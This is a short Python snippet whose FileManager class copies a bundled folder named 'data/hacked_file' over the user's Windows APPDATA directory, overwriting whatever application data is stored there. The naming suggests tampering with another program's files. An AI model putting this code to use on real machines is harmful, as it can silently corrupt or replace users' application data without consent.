import os
from distutils.dir_util import copy_tree

class FileManager:
    path = {
        'appdata': ''
    }

    def __init__(self):
        self.path['appdata'] = os.getenv('APPDATA')

    def overwriteData(self):
        copy_tree("data/hacked_file", self.path['appdata'])